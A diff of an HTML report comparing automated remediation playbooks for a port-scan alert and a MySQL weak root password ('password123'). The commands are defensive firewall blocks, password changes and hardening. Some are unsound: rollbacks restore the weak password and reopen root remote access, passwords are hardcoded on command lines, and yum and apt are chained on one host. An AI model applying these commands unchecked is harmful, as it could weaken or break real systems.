-- 【回退命令】
-  ```
-  iptables -D INPUT -s 185.220.100.250 -j DROP
-  ```
-- 【操作前检查】
-  - 检查是否已存在相关防火墙规则，避免重复添加
-  - 确认该IP非正常业务合作方
-- 【安全建议】
-  - 检查受扫主机22、80、443、3306、6379、27017端口的实际暴露情况，并对所有必要服务及时打补丁
-  - 核查扫描特征（User-Agent: Mozilla/5.0 zgrab/0.x、Nmap SYN）在安全设备中的命中频率
-  - 关联本次扫描源IP的近期威胁情报（Tor出口，归属不明、高风险）
-  - 按独立组织安全流程记录工单编号，留痕处置</pre></div>
+            <div class="solution-content"><pre>【告警分类】恶意扫描
+【风险等级】🟡 MEDIUM（评分：0.55）
+【处置决策】📋 已创建工单，等待人工审核
+
+【事件描述】
+在2025年12月4日18时整，安全监控系统检测到一起大规模的恶意扫描事件。攻击源IP为185.220.100.250，目标为192.168.0.0/16网段的多个关键端口，包括22、80、443、3306、6379和27017。这些端口通常用于SSH、Web服务和数据库服务，表明攻击者可能在寻找潜在的漏洞以进行进一步的攻击。
+
+【风控评估】
+R=0.55(medium): 动作0.80+范围0.50+业务0.28 -&gt; ticket
+本次告警被判定为中等风险（综合风险评分：0.55）。已创建工单，需要安全分析师人工审核后决定处置方案。
+
+【处置Playbook】置信度: 0.95
+
+■ 即时缓解措施
+1. 封禁攻击源IP [priority: critical]
+   描述: 在防火墙阻断185.220.100.250的所有入站流量，防止进一步扫描与攻击
+   执行命令(Linux): iptables -I INPUT -s 185.220.100.250 -j DROP
+   执行命令(Windows): netsh advfirewall firewall add rule name="Block_185.220.100.250" dir=in action=block remoteip=185.220.100.250
+   回退命令(Linux): iptables -D INPUT -s 185.220.100.250 -j DROP
+   回退命令(Windows): netsh advfirewall firewall delete rule name="Block_185.220.100.250"
+   Pre-check: 确认185.220.100.250不是内部信任IP、VPN出口或业务依赖的IP，再进行封禁
+
+■ 根因修复方案
+1. 检查并修复暴露服务漏洞 [priority: high]
+   描述: 对22、80、443、3306、6379、27017等端口对应服务进行漏洞扫描与补丁升级，消除潜在攻击面
+   执行命令(Linux): for port in 22 80 443 3306 6379 27017; do nmap -p $port --script vuln 127.0.0.1; done &amp;&amp; yum update &amp;&amp; apt upgrade
+   回退命令(Linux): yum history undo last &amp;&amp; apt-get autoremove &amp;&amp; apt-get clean
+   Pre-check: 在测试环境验证升级兼容性，确认业务低峰期执行，备份关键数据
+
+2. 限制暴露端口访问来源 [priority: high]
+   描述: 将22、3306、6379、27017等高危端口仅对运维管理网段开放，减少暴露面
+   执行命令(Linux): iptables -A INPUT -p tcp -m multiport --dports 22,3306,6379,27017 -s 10.0.0.0/8 -j ACCEPT &amp;&amp; iptables -A INPUT -p tcp -m multiport --dports 22,3306,6379,27017 -j DROP
+   回退命令(Linux): iptables -D INPUT -p tcp -m multiport --dports 22,3306,6379,27017 -j DROP
+   Pre-check: 确认允许的管理网段范围覆盖所有合法运维终端，避免误锁业务
+
+■ 预防加固措施
+1. 加固Web及数据库服务安全配置 [priority: medium]
+   描述: 关闭未用服务、禁用默认账户、设置强密码，提升暴露服务安全性
+   执行命令(Linux): systemctl disable redis &amp;&amp; systemctl stop redis &amp;&amp; usermod -L root &amp;&amp; passwd -l root
+   回退命令(Linux): systemctl enable redis &amp;&amp; systemctl start redis &amp;&amp; usermod -U root &amp;&amp; passwd -u root
+   Pre-check: 确认redis、MongoDB等服务是否实际需要，root/Administrator账户禁用前确认有其他管理员账户可用
+
+2. 启用异常访问行为监控 [priority: medium]
+   描述: 部署IDS/IPS或日志审计，实时报警异常扫描与暴力破解行为
+   执行命令(Linux): apt install suricata &amp;&amp; systemctl enable suricata &amp;&amp; systemctl start suricata
+   回退命令(Linux): systemctl stop suricata &amp;&amp; apt remove suricata
+   Pre-check: 确认主机性能满足IDS/IPS部署要求，未与现有安全产品冲突</pre></div>
         </div>
     </div>
     
@@ -1427,69 +1587,85 @@
     <div class="solutions-container">
         <div class="solution-box">
             <div class="solution-header plan-a">🅰️ 方案A</div>
-            <div class="solution-content"><pre>1. 修改root账户密码为复杂密码，如：`MyS3cure!p@ssw0rd2025` 
-   ```sql
-   ALTER USER 'root'@'localhost' IDENTIFIED BY 'MyS3cure!p@ssw0rd2025';
-   FLUSH PRIVILEGES;
-   ```
-2. 限制root账户不能远程登录，确保只允许本地访问：
-   ```sql
-   UPDATE mysql.user SET Host='localhost' WHERE User='root';
-   FLUSH PRIVILEGES;
-   ```
-3. 启用密码复杂度插件（validate_password），建议设置如下：
-   ```sql
-   INSTALL PLUGIN validate_password SONAME 'validate_password.so';
-   SET GLOBAL validate_password.policy=STRONG;
-   SET GLOBAL validate_password.length=12;
-   ```
-4. 建议后续定期审计高权限账户密码</pre></div>
+            <div class="solution-content"><pre>## 事件描述
+在2025年12月4日19:30，安全系统通过内部合规扫描发现，位于192.168.1.150主机上的MySQL服务（端口3306）存在root账户使用弱密码"password123"的情况。这种弱密码极易被攻击者通过暴力破解等方式获取，从而造成数据库被非法访问的风险。
+
+## 攻击分类
+凭证访问（Credential Access）- 暴力破解（Brute Force）  
+属于弱口令管理导致的安全隐患。
+
+## 风险评估
+**风险等级：中**  
+**理由：**  
+虽然此次告警是由内部合规扫描发现，尚未有外部攻击行为发生，但root账户作为MySQL数据库的最高权限用户，其弱密码极易被攻击者利用。
+
+## 处置建议
+
+### 1. 即时缓解措施
+- 立即为MySQL root账户设置高强度密码（包含大小写字母、数字、特殊字符，长度不少于12位）
+- 检查是否有异常登录行为，排查是否已被入侵
+- 临时限制root账户的远程登录权限，仅允许本地连接
+
+### 2. 根因修复方案
+- 检查所有MySQL用户账户，确保不存在其他弱密码账户
+- 启用MySQL密码复杂度插件（如validate_password），强制执行密码复杂度策略
+- 禁止root账户远程登录（将host设为localhost）
+
+### 3. 预防加固措施
+- 建立定期的弱口令扫描和合规检查机制
+- 对所有数据库账户定期强制更换密码
+- 启用MySQL的日志审计功能，及时发现异常操作</pre></div>
         </div>
         
         <div class="solution-box">
             <div class="solution-header plan-b">🅱️ 方案B</div>
-            <div class="solution-content"><pre>- **告警解析**  
-  - 类型：弱口令-MySQL数据库
-  - 影响：root账户存在弱密码（password123），攻击者可通过暴力破解获得数据库高权限
-  - 关联标准：ATT&CK(凭证访问:TA0006，暴力破解:T1110)
+            <div class="solution-content"><pre>【告警分类】弱口令/暴力破解
+【风险等级】🟢 LOW（评分：0.37）
+【处置决策】✅ 告警已关闭
 
-- **证据链**  
-  - 资产：192.168.1.150:3306
-  - 用户：root
-  - 弱口令：password123
-  - 检查方式：内部合规扫描
+【事件描述】
+在2025年12月4日19:30，一次内部合规扫描在192.168.1.150主机上发现了一个安全隐患。MySQL服务的root账户使用了一个弱密码（password123），这使得系统容易受到暴力破解攻击的威胁。虽然当前威胁等级被评估为低危，但如果不及时处理，攻击者可能会利用这一漏洞进行未经授权的访问。
 
-- **自动Playbook**  
+【风控评估】
+R=0.37(low): 动作0.50+范围0.30+业务0.28 -&gt; close
+本次告警被判定为低风险（综合风险评分：0.37）。风险较低，系统已自动关闭该告警。
 
-  1. **预检查-登录连接可用性**
-     ```
-     mysql -uroot -p'password123' -h192.168.1.150 -e "SELECT VERSION();" || echo "连接失败，任务中止"
-     ```
-  2. **随机生成复杂新密码：**
-     ```
-     NEWPASS=$(openssl rand -base64 16)
-     echo "生成新密码: $NEWPASS"
-     ```
-  3. **修改root密码（含验证）：**
-     ```sh
-     mysql -uroot -p'password123' -h192.168.1.150 -e "ALTER USER 'root'@'localhost' IDENTIFIED BY '${NEWPASS}'; FLUSH PRIVILEGES;"
-     ```
-  4. **限制root远程登录：**
-     ```sh
-     mysql -uroot -p"${NEWPASS}" -h192.168.1.150 -e "UPDATE mysql.user SET Host='localhost' WHERE User='root'; FLUSH PRIVILEGES;"
-     ```
-  5. **启用密码复杂度策略：**
-     ```sh
-     mysql -uroot -p"${NEWPASS}" -h192.168.1.150 -e "INSTALL PLUGIN validate_password SONAME 'validate_password.so'; SET GLOBAL validate_password.policy=STRONG; SET GLOBAL validate_password.length=12;"
-     ```
-  6. **回退方案（Rollback）：**  
-     若新密码有误或业务中断，可临时恢复弱口令：
-     ```sh
-     mysql -uroot -p"${NEWPASS}" -h192.168.1.150 -e "ALTER USER 'root'@'localhost' IDENTIFIED BY 'password123'; FLUSH PRIVILEGES;"
-     ```
-  7. **风险提示：**
-     - 修改root密码前，须提前通知影响业务的相关人员
-     - 检查root以外的高权限账户是否也有类似弱口令</pre></div>
+【处置Playbook】置信度: 0.95
+
+■ 即时缓解措施
+1. 立即修改MySQL root账户密码 [priority: critical]
+   描述: 将MySQL root账户密码更改为高强度随机密码，立即消除弱口令风险
+   执行命令(Linux): mysql -uroot -ppassword123 -e "ALTER USER 'root'@'localhost' IDENTIFIED BY 'New_Str0ng!P@ssw0rd';"
+   执行命令(Windows): "C:\Program Files\MySQL\MySQL Server 8.0\bin\mysql.exe" -uroot -ppassword123 -e "ALTER USER 'root'@'localhost' IDENTIFIED BY 'New_Str0ng!P@ssw0rd';"
+   回退命令(Linux): mysql -uroot -pNew_Str0ng!P@ssw0rd -e "ALTER USER 'root'@'localhost' IDENTIFIED BY 'password123';"
+   回退命令(Windows): "C:\Program Files\MySQL\MySQL Server 8.0\bin\mysql.exe" -uroot -pNew_Str0ng!P@ssw0rd -e "ALTER USER 'root'@'localhost' IDENTIFIED BY 'password123';"
+   Pre-check: 确认root账户当前密码为password123，且有数据库操作权限。建议提前备份数据库
+
+■ 根因修复方案
+1. 限制MySQL root账户远程登录 [priority: high]
+   描述: 只允许root账户本地登录，防止远程暴力破解
+   执行命令(Linux): mysql -uroot -pNew_Str0ng!P@ssw0rd -e "UPDATE mysql.user SET Host='localhost' WHERE User='root'; FLUSH PRIVILEGES;"
+   执行命令(Windows): "C:\Program Files\MySQL\MySQL Server 8.0\bin\mysql.exe" -uroot -pNew_Str0ng!P@ssw0rd -e "UPDATE mysql.user SET Host='localhost' WHERE User='root'; FLUSH PRIVILEGES;"
+   回退命令(Linux): mysql -uroot -pNew_Str0ng!P@ssw0rd -e "UPDATE mysql.user SET Host='%' WHERE User='root'; FLUSH PRIVILEGES;"
+   回退命令(Windows): "C:\Program Files\MySQL\MySQL Server 8.0\bin\mysql.exe" -uroot -pNew_Str0ng!P@ssw0rd -e "UPDATE mysql.user SET Host='%' WHERE User='root'; FLUSH PRIVILEGES;"
+   Pre-check: 确认业务系统不依赖root远程登录，建议提前测试业务连通性
+
+■ 预防加固措施
+1. 启用MySQL密码复杂度策略 [priority: medium]
+   描述: 强制MySQL账户使用复杂密码，防止弱口令再次出现
+   执行命令(Linux): mysql -uroot -pNew_Str0ng!P@ssw0rd -e "INSTALL PLUGIN validate_password SONAME 'validate_password.so'; SET GLOBAL validate_password.policy=STRONG; SET GLOBAL validate_password.length=12;"
+   执行命令(Windows): "C:\Program Files\MySQL\MySQL Server 8.0\bin\mysql.exe" -uroot -pNew_Str0ng!P@ssw0rd -e "INSTALL PLUGIN validate_password SONAME 'validate_password.dll'; SET GLOBAL validate_password.policy=STRONG; SET GLOBAL validate_password.length=12;"
+   回退命令(Linux): mysql -uroot -pNew_Str0ng!P@ssw0rd -e "UNINSTALL PLUGIN validate_password;"
+   回退命令(Windows): "C:\Program Files\MySQL\MySQL Server 8.0\bin\mysql.exe" -uroot -pNew_Str0ng!P@ssw0rd -e "UNINSTALL PLUGIN validate_password;"
+   Pre-check: 确认MySQL未安装validate_password插件时需先安装，且业务密码符合新策略要求
+
+2. 监控MySQL登录失败行为 [priority: medium]
+   描述: 配置MySQL日志记录并监控暴力破解迹象
+   执行命令(Linux): sed -i '/^log_error/s/^#//' /etc/my.cnf &amp;&amp; sed -i '/^log_error/s|=.*|=/var/log/mysql/error.log|' /etc/my.cnf &amp;&amp; systemctl restart mysqld
+   执行命令(Windows): powershell -Command "(Get-Content 'C:\ProgramData\MySQL\MySQL Server 8.0\my.ini') -replace ';log_error', 'log_error' | Set-Content 'C:\ProgramData\MySQL\MySQL Server 8.0\my.ini'; Restart-Service MySQL80"
+   回退命令(Linux): sed -i '/^log_error/s/^/;/' /etc/my.cnf &amp;&amp; systemctl restart mysqld
+   回退命令(Windows): powershell -Command "(Get-Content 'C:\ProgramData\MySQL\MySQL Server 8.0\my.ini') -replace 'log_error', ';log_error' | Set-Content 'C:\ProgramData\MySQL\MySQL Server 8.0\my.ini'; Restart-Service MySQL80"
+   Pre-check: 确认/var/log/mysql/error.log有足够磁盘空间，Windows下日志路径正确，重启数据库前通知业务</pre></div>
         </div>
     </div>
     
